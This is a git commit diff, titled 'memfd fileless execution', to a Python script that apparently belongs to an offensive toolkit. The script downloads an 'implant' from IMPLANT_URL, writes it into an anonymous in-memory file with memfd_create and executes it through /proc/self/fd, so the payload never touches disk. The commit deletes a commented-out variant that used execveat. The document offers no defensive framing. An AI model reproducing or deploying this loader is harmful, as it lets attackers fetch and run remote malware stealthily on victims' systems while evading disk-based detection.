8c762841f0a3561854309383f41bdee7a2f49515
Tristan1118 <tristan.ebert@googlemail.com>
2026-04-22 06:25:48 -0400

    memfd fileless execution

--- linux/in_memory_execution.py
+++ linux/in_memory_execution.py
@@ -6,15 +6,4 @@ data = urllib.request.urlopen(IMPLANT_URL).read()
 fd = os.memfd_create('', 0)
 os.write(fd, data)
 
-# Don't close fd - we need it for the path
 os.execve(f'/proc/self/fd/{fd}', [f'/proc/self/fd/{fd}'], {})
-"""
-data = urllib.request.urlopen(IMPLANT_URL).read()
-fd = os.memfd_create('', 0)
-os.write(fd, data)
-libc = ctypes.CDLL("libc.so.6")
-result = libc.execveat(fd, b"", None, None, 0x1000)
-
-print(f"execveat failed with result: {result}")
-print(f"errno: {ctypes.get_errno()}")
-"""
